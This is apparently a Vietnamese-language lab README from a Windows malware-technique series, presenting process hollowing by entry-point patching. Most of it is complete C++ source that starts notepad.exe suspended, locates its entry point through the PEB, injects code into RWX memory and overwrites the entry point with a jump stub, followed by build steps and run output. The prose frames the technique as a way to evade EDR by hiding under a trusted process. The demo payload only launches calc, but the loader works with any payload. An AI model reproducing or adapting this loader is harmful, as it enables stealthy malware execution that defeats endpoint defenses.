
---

# 📝 [PE 08] Process Hollowing (Active Path Custom)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Process Hollowing** (còn được gọi dưới các thuật ngữ học thuật như *Inline EntryPoint Patching* hoặc *Process Replacement*) đại diện cho một trong những giải thuật né tránh phòng thủ động (Dynamic Evasion) kinh điển và mạnh mẽ nhất trong không gian bộ nhớ ảo.

Thay vì thực hiện hành vi tiêm nhiễm mã máy vào một tiến trình đang vận hành bình thường (một chỉ dấu hành vi vô cùng nhạy cảm dễ dàng bị các cảm biến quét RAM động của EDR tóm gáy do sinh luồng lạ), kỹ thuật này lựa chọn giải pháp **"Mượn xác hoàn hồn" (Process Masquerading)**. Loader chủ động khởi tạo một tiến trình vỏ bọc hoàn toàn hợp pháp và có độ tin cậy cao từ hệ thống (ví dụ: `notepad.exe`) dưới trạng thái đóng băng sơ khởi. Sau đó, cấu trúc PE Header từ xa sẽ bị can thiệp giải phẫu để vá mìn điều hướng ngay tại vạch xuất phát **`EntryPoint`** gốc. Khi luồng thực thi được giải phóng, tiến trình vỏ bọc sẽ tự động kích nổ mã máy của Loader dưới lớp mặt nạ của một danh tính pháp nhân đáng tin cậy.

### 🎯 Mục tiêu nghiên cứu:

* **Kiểm soát vòng đời tiến trình đóng băng**: Điều khiển và thao túng cấu trúc luồng hệ thống thông qua trạng thái sơ khởi `CREATE_SUSPENDED`.
* **Giải phẫu Ngữ cảnh CPU x64 (`CONTEXT`)**: Tiếp cận cấu trúc thanh ghi phần cứng ở không gian người dùng và định vị bản đồ PEB từ xa.
* **Tự động hóa tra cứu bản đồ hệ thống**: Triệt tiêu hoàn toàn chuỗi gán cứng đường dẫn hệ thống bằng giải thuật tự động tra cứu động (Active Path Custom), bảo đảm khả năng tương thích thích ứng kịch trần.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi một tiến trình được sinh ra với cờ cấu hình `CREATE_SUSPENDED`, Windows Kernel sẽ hoàn tất việc thiết lập không gian địa chỉ ảo, nạp các thư viện Subsystem cơ bản (`ntdll.dll`), dựng cấu trúc PEB (Process Environment Block) cùng luồng thực thi chính (Main Thread), nhưng **đóng băng luồng ngay tại vạch xuất phát hệ thống** (trước khi con trỏ lệnh của CPU kịp chạm vào điểm EntryPoint của file nhị phân).

Quy trình toán học giải phẫu và vá mìn điều hướng của Lab PE 08 diễn ra qua 4 giai đoạn ngầm tại bộ nhớ ảo:

```
[CreateProcessW: Đóng băng tiến trình]
       └──> [GetThreadContext: Trích xuất trạng thái thanh ghi]
                 └──> [Đọc PEB -> Bóc tách ImageBaseAddress -> Định vị EntryPoint]
                           └──> [Vá Inline JMP Stub x64 -> ResumeThread kích nổ]

```

1. **Trích xuất Base Address thông qua cấu trúc PEB**: Trên kiến trúc Windows x64, tại thời điểm một luồng thực thi bị đóng băng sơ khởi, thanh ghi **`Rdx`** của CPU sẽ chịu trách nhiệm lưu giữ địa chỉ trỏ đến bản ghi cấu trúc **PEB**. Bằng giải thuật đọc ô nhớ ảo từ xa tại tọa độ toán học `Rdx + 0x10`, Loader sẽ bốc tách chính xác địa chỉ gốc `ImageBaseAddress` thực tế của tiến trình vỏ bọc trên RAM mà không bị ảnh hưởng bởi cơ chế ngẫu nhiên hóa ASLR.
2. **Giải phẫu PE Header định vị tọa độ khai hỏa**: Loader phát lệnh đọc $4\text{ KB}$ phân vùng Headers đầu tiên của `ImageBaseAddress` để phân tích cấu trúc cấu hình DOS và NT Headers từ xa. Tọa độ tuyệt đối của điểm EntryPoint hợp pháp được tính toán kịch khung bằng công thức:

$$\text{RemoteEntryPoint} = \text{ImageBaseAddress} + \text{ntHeaders.OptionalHeader.AddressOfEntryPoint}$$

3. **Thiết lập cấu trúc mìn điều hướng (Inline JMP Patch)**: Thay vì thực hiện giải pháp Unmap toàn bộ mô-đun (hành vi thô bạo này lập tức bị tiểu chuẩn bảo mật bảo vệ bộ nhớ của Windows 11 và EDR chặn đứng), dự án áp dụng kỹ thuật vá mịn Inline tinh vi. Loader chuyển đổi cờ bảo vệ trang nhớ chứa `EntryPoint` sang `RWX` và ghi đè một đoạn mã máy Assembly x64 (JMP Stub) dài 22-byte nhằm cưỡng bách con trỏ lệnh của CPU đâm thẳng vào phân vùng Payload độc lập vị trí (Position-Independent Code) đã được chuẩn bị sẵn.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí sẽ gánh luồng chạy inside lòng tiến trình vỏ bọc
DWORD WINAPI RemoteHollowedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Gọi bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi nhảy tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Giữ luồng sống độc lập inside lòng tiến trình vỏ bọc
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Giải thuật chủ động định vị đường dẫn hệ thống chuẩn chỉ (Zero Static Buffers)
std::wstring GetActiveTargetBuffer(const std::wstring& exeName) {
    // Bước 1: Gọi truyền NULL để OS tự tính toán kích thước vùng nhớ cần thiết
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    // Bước 2: Cấp phát động mảng động vừa khít đến từng byte
    std::vector<wchar_t> systemDirBuf(requiredSize);
    if (GetSystemDirectoryW(systemDirBuf.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(systemDirBuf.data());
    finalPath += L"\\" + exeName; // Ghép toán học chuỗi tên tiến trình mục tiêu
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 08: PROCESS HOLLOWING ACTIVE PATH (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Tự động tra cứu bản đồ thư mục hệ thống thực tế thay vì gán cứng
    std::wstring targetProcessName = L"notepad.exe";
    std::wstring activeSysPath = GetActiveTargetBuffer(targetProcessName);

    if (activeSysPath.empty()) {
        std::cerr << "[-] Khong the chu dong dinh vi duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong xac dinh duong dan vo boc: " << activeSysPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG HỢP PHÁP ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(activeSysPath.c_str()), // Nạp chuỗi đường dẫn chủ động
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Giữ luồng chính ngay tại vạch xuất phát hệ thống
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] Failed to create suspended process. Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao voi PID: " << pi.dwProcessId << std::endl;

    // ─── BƯỚC 2: TRÍCH XUẤT NGỮ CẢNH THANH GHI VÀ TÌM TOẠ ĐỘ BASE ADDRESS TỪ PEB ───
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);

    PVOID baseAddress = NULL;
    // Trên kiến trúc x64, thanh ghi Rdx chứa địa chỉ cấu trúc PEB, offset +0x10 trỏ tới ImageBaseAddress
    ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &baseAddress, sizeof(PVOID), NULL);
    std::cout << "[+] Toa do Base Address goc cua vo boc: 0x" << std::hex << baseAddress << std::endl;

    // ─── BƯỚC 3: GIẢI PHẪU PE HEADERS TỪ XA ĐỂ ĐỊNH VỊ CHÍNH XÁC ENTRYPOINT ───
    BYTE peHeaderBuf[4096];
    if (!ReadProcessMemory(pi.hProcess, baseAddress, peHeaderBuf, sizeof(peHeaderBuf), NULL)) {
        std::cerr << "[-] Khong the doc PE Header tu xa!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peHeaderBuf;
    // ĐỒNG BỘ X64: Ép kiểu rõ ràng về PIMAGE_NT_HEADERS64 để ánh xạ bộ nhớ chính xác tuyệt đối
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)peHeaderBuf + dosHeader->e_lfanew);

    PVOID remoteEntryPoint = (PVOID)((DWORD_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] Toa do EntryPoint hop phap san co cua Notepad: 0x" << std::hex << remoteEntryPoint << std::endl;

    SIZE_T functionSize = 500;

    // ─── BƯỚC 4: CẤP PHÁT PHÂN VÙNG MÃ MÁY VÀ THAM SỐ TUYỆT ĐỐI TỪ XA ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] Cap phat bo nho vung payload tu xa that bai!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 5: KHỞI TẠO CON TRỎ TUYỆT ĐỐI VÀ ĐẨY LOGIC HÀM SANG RAM NOTEPAD ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPVOID)RemoteHollowedPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 6: ĐỘT PHÁ CƠ CHẾ VÁ LỆNH TẠI ENTRYPOINT GỐC HỢP PHÁP ───
    DWORD oldProtect = 0;
    if (VirtualProtectEx(pi.hProcess, remoteEntryPoint, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {

        // Mã máy lệnh nhảy tuyệt đối x64 bẻ hướng dòng chảy CPU đâm thẳng vào Payload của ta
        unsigned char jmpStub[] = {
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Địa chỉ nạp cấu trúc dữ liệu tham số)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 (Địa chỉ nạp vùng thực thi Code)
            0xFF, 0xE0                                                  // jmp rax
        };

        // Vá tọa độ tuyệt đối chính xác vào thân mìn điều hướng
        *(DWORD_PTR*)(jmpStub + 2) = (DWORD_PTR)pRemoteData;
        *(DWORD_PTR*)(jmpStub + 12) = (DWORD_PTR)remoteCodeBuffer;

        // Ghi đè trực tiếp mìn điều hướng vào EntryPoint hợp pháp đang sống của Notepad
        WriteProcessMemory(pi.hProcess, remoteEntryPoint, jmpStub, sizeof(jmpStub), NULL);

        // Phục hồi lại quyền bảo vệ trang nhớ nguyên bản để xóa sạch dấu vết can thiệp của giải pháp an ninh
        VirtualProtectEx(pi.hProcess, remoteEntryPoint, 32, oldProtect, &oldProtect);
        std::cout << "[+] Nap va thiet lap JMP Stub be huong tai EntryPoint hop phap hoan tat!" << std::endl;
    }
    else {
        std::cerr << "[-] Lat quyen EntryPoint de ghi de that bai! Error: " << GetLastError() << std::endl;
    }

    // ─── BƯỚC 7: KÍCH HOẠT RÃ ĐÔNG ĐỂ LUỒNG TỰ ĐỘNG KHAI HỎA CHIẾN DỊCH ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread) de luong tu dong kich no APC..." << std::endl;
    ResumeThread(pi.hThread);

    std::cout << "\n[+] Process Hollowing (Active Path Custom) Successful!" << std::endl;
    std::cout << "[*] Nhan phim Enter de don dep va dong cua so..." << std::endl;
    std::cin.get();

    // Thu hồi triệt để tài nguyên chống rò rỉ bộ nhớ (Memory Leak)
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file thực thi Loader vận hành phẳng sạch, hoàn chỉnh và độc lập khi triển khai thực nghiệm trên môi trường máy ảo VM sạch cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
2. Di chuyển đến mục thuộc tính: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng cấu hình `Runtime Library`, chuyển thông số sang định dạng cờ **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ mã nguồn CRT.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân hoàn thiện.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khai hỏa file thực thi thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi ma trận can thiệp ngữ cảnh:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE07_Reflective_DLL_Loading_Lagos_Island\x64\Release> C:\Users\Admin\source\repos\Task6\PE08_Process_Hollowing\x64\Release\Process_Hollowing.exe
====================================================
[*] PE 08: PROCESS HOLLOWING ACTIVE PATH (CALC.EXE)
====================================================
[+] Da chu dong xac dinh duong dan vo boc: C:\WINDOWS\system32\notepad.exe
[*] Dang khoi tao tien trinh vo boc o trang thai dong bang...
[+] Tien trinh vo boc duoc tao voi PID: 13288
[+] Toa do Base Address goc cua vo boc: 0x00007FF7AFEA0000
[+] Toa do EntryPoint hop phap san co cua Notepad: 0x00007FF7B0002230
[+] Vung nho Code RWX cua payload dat tai: 0x0000025C130D0000
[+] Nap va thiet lap JMP Stub be huong tai EntryPoint hop phap hoan tat!
[*] Kich hoat ra dong (ResumeThread) de luong tu dong kich no APC...

[+] Process Hollowing (Active Path Custom) Successful!
[*] Nhan phim Enter de don dep va dong cua so...

```

### Demo:
<img width="1920" height="600" alt="devenv_cAeNqlDm1h" src="https://github.com/user-attachments/assets/055f6b42-b507-4a35-85f4-749742da92b0" />


---
